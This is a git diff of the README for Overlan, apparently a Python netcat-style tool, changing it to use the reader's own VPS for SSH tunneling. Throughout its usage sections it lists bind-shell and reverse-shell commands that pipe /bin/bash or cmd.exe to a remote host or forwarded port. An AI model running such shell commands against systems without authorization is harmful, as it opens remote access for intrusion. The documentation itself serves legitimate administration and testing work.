@@ -37,7 +37,7 @@ CAUSED BY THIS PROGRAM.
 + pycryptodome
 + paramiko
 
-## Install
+## Install Overlan
 
 Unix:
 
@@ -63,6 +63,55 @@ Git:
 
 	python3 setup.py install
 	
+## Creat SSH tunneling server and user on your VPS (Facultative)
+
+Port forwarding requires using your own VPS with an SSH server. This allows you to expose a local service such as a http web server or tcp listener or bind shell on the internet.
+
+###### Creat tunneling restricted user overlan:
+
+	sudo creatuser overlan
+
+###### Set sshd_config:
+
+Go to /etc/ssh 
+
+	cd /etc/ssh
+
+Add resticted user overlan to sshd_config:
+ 
+	Match User overlan
+   	
+		AllowTcpForwarding yes
+   	
+		X11Forwarding yes
+   	
+		PermitTunnel yes
+   	
+		GatewayPorts yes
+   	
+		AllowAgentForwarding no
+   	
+		#PermitOpen localhost:62222
+   	
+		ForceCommand echo "no shell - only tunneling"
+   	
+		PasswordAuthentication yes
+
+You have now a restricted user:
+
+	{
+		"hostname":"<your VPS IP>",
+		
+		"username":"<overlan or another username>"
+
+		"port":"<22 or another port>"
+
+		"password":"<your secret password>"
+
+	}
+
+
+**Security Warning: If GatewayPorts is yes, enable remote forwarded bind shell without AES encryption is very dangerous ! Anybody can scan your IP and discover port running your remote forwarded bind shell and connect to it !**
 
 
 ## Commands Line Interface
@@ -78,9 +127,9 @@ Listen on localhost port 4444 password protected
 	
 	overlan -l 4444 -k mysecret
 
-Listen on port 4444 and remote forward to overlan server port 8888
+Listen on port 4444 and remote forward to your VPS port 8888
 	
-	overlan -l 4444 -R 8888
+	overlan -l 4444 -R username:hostname:port:password:8888
 
 #### Connect
 
@@ -92,31 +141,32 @@ Connect to localhost port 4444 password protected
 	
 	overlan localhost 4444 -k mysecret
 
-Connect to overlan server port 4444
+Connect to your VPS port 4444
 	
-	overlan overlan 4444
+	overlan host 4444
+
 
 #### Port forwarding
 
 ###### Overlan
 
-Remote forward localhost 4444 to overlan server port 8888
+Remote forward localhost 4444 to your VPS port 8888
 
-	overlan 4444 -R 8888
+	overlan 4444 -R username:hostname:port:password:8888
 
-Local forward overlan server port 8888 to localhost 4444
+Local forward from your VPS port 8888 to localhost 4444
 
-	overlan 8888 -L 4444
+	overlan 8888 -L username:hostname:port:password:4444
 
 ###### SSH
 
-Remote forward localhost 4444 to overlan server port 8888 
+Remote forward localhost 4444 to your VPS port 8888 
 
-	ssh -N -R 8888:localhost:4444 overlan@141.94.203.12 -p 22
+	ssh -N -R 8888:localhost:4444 username@hostname -p 22
 
-Local forward localhost 4444 to overlan server port 8888 
+Local forward localhost 4444 from your VPS port 8888 
 
-	ssh -N -L 4444:localhost:8888 overlan@141.94.203.12 -p 22
+	ssh -N -L 4444:localhost:8888 username@hostname -p 22
 
 #### Bind Shell
 
@@ -126,21 +176,23 @@ Unix
 
 - `overlan -l 4444 -e pty:/bin/bash` - Interactive PTY BindShell listen on localhost port 4444. (Don't support password)
 
-- `overlan -l 4444 -e /bin/bash -R 8888` - BindShell listen on port 4444 and remote forward to overlan server port 8888.
+- `overlan -l 4444 -e pty:/bin/bash -R username:hostname:port:password:8888` - Interactive PTY BindShell listen on localhost port 4444 and remote forward to your VPS port 8888. (Don't support password)
+
+- `overlan -l 4444 -e /bin/bash -R username:hostname:port:password:8888` - BindShell listen on port 4444 and remote forward to your VPS port 8888.
 	
 - `overlan -l 4444 -e /bin/bash -k mypassowrd` - Password protected BindShell listen on localhost 4444.
 
-- `overlan -l 4444 -e /bin/bash -k mypassword -R 8888` - Password protected BindShell listen on port 4444 and remote forward to overlan server port 8888.
+- `overlan -l 4444 -e /bin/bash -k mypassword -R username:hostname:port:password:8888` - Password protected BindShell listen on port 4444 and remote forwarded to your VPS port 8888.
 
 Windows
 
 - `overlan -l 4444 -e cmd.exe` - BindShell listen on localhost port 4444.
 
-- `overlan -l 4444 -e cmd.exe -R 8888` - BindShell listen on port 4444 and remote forward to overlan server port 8888.
+- `overlan -l 4444 -e cmd.exe -R username:hostname:port:password:8888` - BindShell listen on port 4444 and remote forward to your VPS port 8888.
 	
 - `overlan -l 4444 -e cmd.exe -k mypassowrd` - Password protected BindShell listen on localhost port 4444.
 
-- `overlan -l 4444 -e cmd.exe -k mypassword -R 8888` - Password protected BindShell listen on port 4444 and remote forward to overlan server port 8888.
+- `overlan -l 4444 -e cmd.exe -k mypassword -R username:hostname:port:password:8888` - Password protected BindShell listen on port 4444 and remote forward to your VPS port 8888.
 
 #### Reverse Shell
 
@@ -150,21 +202,21 @@ Unix
 
 - `overlan localhost 4444 -e pty:/bin/bash` - Interactive PTY ReverseShell connect to listener on localhost port 4444. (Don't support password)
 
-- `overlan overlan 4444 -e /bin/bash` - ReverseShell connect to listener on overlan server port 4444.
+- `overlan hostname 4444 -e /bin/bash` - ReverseShell connect to listener on your VPS port 4444.
 
 - `overlan localhost 4444 -e /bin/bash -k mypassowrd` - Password protected ReverseShell connect to localhost port 4444.
 
-- `overlan overlan 4444 -e /bin/bash -k mypassowrd` - Password protected ReverseShell connect to overlan server port 4444.
+- `overlan hostname 4444 -e /bin/bash -k mypassowrd` - Password protected ReverseShell connect to your VPS port 4444.
 
 Windows
 
 - `overlan localhost 4444 -e cmd.exe` - ReverseShell connect to listener on localhost port 4444.
 
-- `overlan overlan 4444 -e cmd.exe` - ReverseShell connect to listener on overlan server port 4444.
+- `overlan hostname 4444 -e cmd.exe` - ReverseShell connect to listener on your VPS port 4444.
 
 - `overlan localhost 4444 -e cmd.exe -k mypassowrd` - Password protected ReverseShell connect to localhost port 4444.
 
-- `overlan overlan 4444 -e cmd.exe -k mypassowrd` - Password protected ReverseShell connect to overlan server port 4444.
+- `overlan hostname 4444 -e cmd.exe -k mypassowrd` - Password protected ReverseShell connect to your VPS port 4444.
 
 
 ## Help
@@ -187,9 +239,11 @@ optional arguments:
                         Executable: /bin/bash, /bin/sh, cmd.exe
   -c, --connect         Connect to host and port specified
   -R REMOTE, --remote REMOTE
-                        Remote forward to remote_port
+                        Remote forward to
+                        <username>:<host>:<port>:<password>:<remote_port>
   -L LOCAL, --local LOCAL
-                        Local forward from remote_port
+                        Local forward from
+                        <username>:<host>:<port>:<password>:<remote_port>
   -k KEY, --key KEY     Password for AES derivation key
   -d DELAY, --delay DELAY
                         Timeout delay
@@ -198,7 +252,7 @@ optional arguments:
 ## Use within python
 
 
-Use overlan ssh server:
+Use on LAN:
 
 
 ```
@@ -208,7 +262,7 @@ v = Overlan()
 
 ```
 
-Specify another external ssh server:
+Specify your VPS SSH server:
 
 ```
 from overlan import Overlan
